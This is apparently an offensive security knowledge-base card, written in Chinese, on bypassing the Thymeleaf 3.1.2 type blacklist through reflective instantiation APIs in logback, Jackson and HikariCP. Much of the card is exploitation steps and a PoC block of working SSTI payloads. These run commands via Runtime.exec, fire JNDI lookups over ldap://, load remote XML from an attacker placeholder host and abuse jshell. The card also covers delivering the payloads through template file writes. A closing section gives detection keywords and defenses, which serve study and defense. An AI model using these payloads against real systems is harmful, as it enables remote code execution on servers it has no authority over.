---
id: web-java-expression-spel-thymeleaf-312-istypeallowed-prefix-blacklist-bypass
title: Thymeleaf 3.1.2 类型黑名单绕过：非 c/j/o/s 包直接放行 + 借第三方反射实例化 API 套娃执行 SpEL/EL
type: scenario
domain: web
path: web/java/expression/spel
technique: thymeleaf-312-istypeallowed-trampoline-bypass
tags:
- java
- thymeleaf
- spel
- ssti
- sandbox-bypass
- jndi
- blacklist
- rce
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: Thymeleaf 3.1.2（spring-boot-starter-thymeleaf 3.3.0 默认引入；原文未给出修复版本）
verification:
  verified_by: verifier-V343
  verified_at: '2026-11-08T22:33:02+08:00'
  notes: 已对照原文图01-08核对 isTypeAllowed/isTypeBlockedForTypeReference/isTypeBlockedForAllPurposes 三段源码、c/j/o/s 首字符放行与 java.* 拦截逻辑，以及 OptionHelper/HikariConfig/UtilityElf/ClassUtil 四个跳板 payload；affected_versions 按原文 3.1.2（Spring Boot 3.3.0）保留。四个跳板属同一绕过姿势的不同替代类，未拆分。
url: /docs/web/java/expression/spel/web-java-expression-spel-thymeleaf-312-istypeallowed-prefix-blacklist-bypass/
draft: false
kb_aliases:
- Thymeleaf 3.1.2 绕过
- isTypeAllowed 黑名单
- Thymeleaf 沙箱绕过
- OptionHelper instantiateByClassName
- HikariConfig JNDI
- UtilityElf createInstance
- ClassUtil createInstance SpEL
---

## 一句话结论

Thymeleaf 3.1.2 的 `ExpressionUtils.isTypeAllowed` 只按**包名前缀**检查表达式里出现的类型引用：不以 `c/j/o/s` 开头的包直接放行，`com.sun.` 与 `java.*`（除 `java.time`）等被禁；绕过的关键是找一个**允许包中、接受类名字符串并反射实例化**的第三方 API（logback `OptionHelper.instantiateByClassName`、Jackson `ClassUtil.createInstance`、Hikari `UtilityElf.createInstance`），把被禁类名当作普通字符串传进去，实例化 `SpelExpressionParser`/`ClassPathXmlApplicationContext`/`ELProcessor` 后再执行 SpEL/EL/JNDI，黑名单因为看不到类型引用而失效。

## 原理

- **防御入口**：Thymeleaf 渲染 `[[${...}]]` 表达式时，`SPELVariableExpressionEvaluator.evaluate` → `getValue` → `findType` 会调用 `org.thymeleaf.util.ExpressionUtils#isTypeAllowed(typeName)`；`typeName` 是表达式中的类型引用（如 `T(java.lang.Runtime)`、`new ...`）。
- **`isTypeAllowed` 逻辑**：先 `normalize(typeName)`；若 `!isTypeBlockedForTypeReference(normalized)` 直接返回 true；否则只允许 `ALLOWED_JAVA_CLASS_NAMES`/`ALLOWED_JAVA_SUPERS_NAMES` 中的少量类型。
- **`isTypeBlockedForAllPurposes`（第一条黑名单）**：
  - 首字符不是 `c/j/o/s` → 直接放过；
  - `c` 开头只拦 `com.sun.`；
  - `java.` 开头除 `java.time.` 外全部拦；
  - 其余匹配 `BLOCKED_ALL_PURPOSES_PACKAGE_NAME_PREFIXES`（`jakarta.`、`org.xml.sax.`、`sun.`、`org.ietf.jgss.`、`javax.`、`org.omg.`、`com.sun.`、`org.w3c.dom.`、`jdk.`、`java.`）。
- **`isTypeBlockedForTypeReference`（第二条黑名单）**：首字符不是 `c/n/j/o` → 放过；`c` 开头拦 `com.squareup.javapoet.`；其余匹配 `BLOCKED_TYPE_REFERENCE_PACKAGE_NAME_PREFIXES`（`net.bytebuddy.`、`net.sf.cglib.`、`javassist.`、`org.apache.bcel.`、`org.aspectj.`、`org.mockito.`、`org.objectweb.asm.`、`org.objenesis.`、`org.springframework.` 下 aop/asm/beans/cglib/context/expression/javapoet/util/web/webflow 等、`org.springframework.aot.` 等）。
- **为什么能绕过**：黑名单检查的是**表达式 AST 中的类型引用**；当代码写成 `T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName("org.springframework.expression.spel.standard.SpelExpressionParser", ...)` 时，`ch.qos...OptionHelper` 首字符 `c` 但不在 `com.sun.`，通过；而真正危险的 `SpelExpressionParser` 只是一个**字符串参数**，不经过 `isTypeAllowed` 检查，被反射实例化后由攻击者控制其 `parseExpression(...)` 内容，进而执行 `T(java.lang.String).forName('java.lang.Runtime')...`（此时在 SpEL 自身的解析器里，绕开了 Thymeleaf 的检查）。
- **同理可套娃**：任何「允许包 + 反射实例化/加载类」的 API 都可作为跳板；Hikari `UtilityElf.createInstance` 可实例化 `ClassPathXmlApplicationContext`（远程 XML）或 `ELProcessor`（Jakarta EL）；Jackson `ClassUtil.createInstance` 可实例化 `SpelExpressionParser`；`HikariConfig#setMetricRegistry` 直接把字符串当 JNDI URL/对象使用。
- **与文件写的关系**：在任意文件写/上传场景下，向应用 `templates` 目录写入包含上述表达式的 `.html` 模板，再让应用渲染该模板即可触发；模板对前后脏字符容忍度高，比写 cron/SSH 公钥更通用（jar 打包且无文件包含时除外）。
- **边界**：目标 classpath 必须包含对应第三方类（Spring Boot 默认带 logback、Jackson、HikariCP；Tomcat/JDK 提供 EL/jshell）；若 Thymeleaf 后续版本改为白名单或禁止 `T()`/`new`，payload 需重挖；JNDI/远程 XML 需要出网。

## 触发条件

- 应用使用 Thymeleaf 3.1.2（Spring Boot 3.3.0 默认）且存在可控模板渲染/SSTI 或任意文件写→模板目录。
- classpath 含 logback-core、Jackson databind、HikariCP（Spring Boot 常见默认依赖）；需要 JNDI/远程加载时目标可出网，或 JDK 17 可用 jshell。
- 表达式渲染点可达（视图名、主题名、动态模板内容等），且未被额外 WAF 拦截 `T(`、`new`、`${` 等关键字。
- 目标未升级到修复该黑名单绕过逻辑的版本或未启用更严格的白名单。

## 利用步骤

1. 确认版本：`thymeleaf-3.1.2.RELEASE.jar`（Spring Boot 3.3.0 默认）；先发 `[[${T(java.lang.Runtime).getRuntime().exec('whoami')}]]` 观察是否被 `isTypeAllowed` 拦截。
2. 选择跳板：有 logback 用 `OptionHelper.instantiateByClassName` 实例化 `SpelExpressionParser`；无 logback 用 Jackson `ClassUtil.createInstance`；需要 JNDI 用 `HikariConfig#setMetricRegistry`；不出网且 JDK17 用 `UtilityElf.createInstance('jakarta.el.ELProcessor',...)` + Tomcat `IntrospectionUtils.callMethodN` + `jshell`。
3. 构造 `[[${...}]]` 表达式，外层只用允许包的类型引用，危险类名以字符串形式传给跳板；在内层 SpEL/EL 中执行命令/读取文件/加载远程 XML。
4. 若入口是任意文件写：把表达式写入 `templates/` 下的 `.html`，请求渲染该模板触发。
5. 验证命令执行/文件读取；清理模板/文件并评估影响。

## PoC

```text
# 1) 直接 T(java.lang.Runtime) —— 会被 3.1.2 黑名单拦截
[[${T(java.lang.Runtime).getRuntime().exec("whoami")}]]

# 2) logback OptionHelper 套娃实例化 SpelExpressionParser
[[${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName("org.springframework.expression.spel.standard.SpelExpressionParser","".getClass().getSuperclass(),T(ch.qos.logback.core.util.OptionHelper).getClassLoader()).parseExpression("T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('whoami')").getValue()}]]

# 3) HikariConfig setMetricRegistry 触发 JNDI（需出网）
[[${New com.zaxxer.hikari.HikariConfig().setMetricRegistry("ldap://127.0.0.1:1389")}]]

# 4) Hikari UtilityElf 反射实例化 ClassPathXmlApplicationContext 加载远程 XML（需出网）
[[${T(com.zaxxer.hikari.util.UtilityElf).createInstance("org.springframework.context.support.ClassPathXmlApplicationContext","".getClass().forName("org.springframework.context.support.ClassPathXmlApplicationContext"),"http://<attacker>/poc.xml")}]]

# 5) Hikari UtilityElf + ELProcessor + Tomcat IntrospectionUtils + jshell（JDK17，不出网执行 EL）
[[${T(org.apache.tomcat.util.IntrospectionUtils).callMethodN(T(com.zaxxer.hikari.util.UtilityElf).createInstance('jakarta.el.ELProcessor', T(ch.qos.logback.core.util.Loader).loadClass('jakarta.el.ELProcessor')), 'eval', new java.lang.String[]{'"".getClass().forName("jdk.jshell.JShell").getMethods()[6].invoke("".getClass().forName("jdk.jshell.JShell")).eval("java.lang.Runtime.getRuntime().exec(\"calc\")")'}, T(org.apache.el.util.ReflectionUtil).toTypeArray(new java.lang.String[]{"java.lang.String"}))}]]

# 6) Jackson ClassUtil 套娃实例化 SpelExpressionParser
[[${T(com.fasterxml.jackson.databind.util.ClassUtil).createInstance("".getClass().forName('org.spr'+'ingframework.expression.spel.standard.SpelExpressionParser'),true).parseExpression("T(java.lang.String).forName('java.lang.Runtime').getRuntime().exec('calc')").getValue()}]]
```

说明：payload 来自文中研究，未在本会话执行；`<attacker>` 为占位；依赖目标 classpath 与出网条件。

## 变体与关联

- [[web-java-expression-spel-thymeleaf-312-typestatic-whitespace-bypass]]：Thymeleaf 3.0.12 的 `T(` 静态访问检测用空格/换行绕过；本卡是 3.1.2 的包名前缀黑名单 + 反射跳板，版本与机制不同。
- [[web-java-expression-spel-thymeleaf-strings-reflection-file-read]]：禁用 `T()` 时用字符串反射读文件；本卡用允许包的反射 API 实例化 SpEL/EL。
- [[web-java-expression-spel-thymeleaf-viewname-preprocessing-ssti]]、[[web-java-expression-spel-thymeleaf-theme-name-stored-ssti]]：Thymeleaf SSTI 的触发入口；本卡解决 3.1.2 下的执行限制。
- [[web-java-deserialization-jndi-high-version-beanfactory-el]]：高版本 JNDI 的 BeanFactory+ELProcessor 绕过，可与本卡的 `UtilityElf` 跳板组合。
- [[web-java-expression-spel-jwt-leak-upload-thymeleaf-template-rce]]：上传 Thymeleaf 模板的触发方式，可配合本卡的 payload。
- 变体：跳板类可换任意「允许包 + 反射实例化/类加载」API；内层可换 SpEL、Jakarta EL、JNDI、远程 XML；表达式入口可换视图名、主题、片段、动态模板。
- 边界：classpath 缺依赖、出网被禁、Thymeleaf 升级为白名单/禁用 `T()`/`new`、WAF 拦截关键字符串时 payload 失效。

## 检测与防御

- 检测：请求参数/模板内容中出现 `[[${`、`T(`、`new `、`instantiateByClassName`、`ClassUtil`、`UtilityElf`、`HikariConfig`、`setMetricRegistry`、`ldap://`/`rmi://`、`ClassPathXmlApplicationContext`、`jshell` 等组合；Thymeleaf 异常栈出现 `isTypeAllowed`/`SPELVariableExpressionEvaluator`。
- 检测：应用日志/流量中出现以字符串形式传递的危险类名（`SpelExpressionParser`、`Runtime`、`ELProcessor`）；远程 XML/JNDI 出网。
- 防御：升级到修复该绕过逻辑的 Thymeleaf 版本；不要渲染用户可控模板（改用固定模板+参数绑定）；最小化 classpath（移除不必要的 logback/Hikari/Jackson 配置面）；禁用/限制 `T()`/`new` 与表达式求值；对模板目录做完整性/写入监控；对 JNDI/远程加载出网限制。
- 响应：定位被写入的模板文件与入口、清除并修复文件写漏洞；轮换可能泄露的凭据；排查同类表达式注入点。
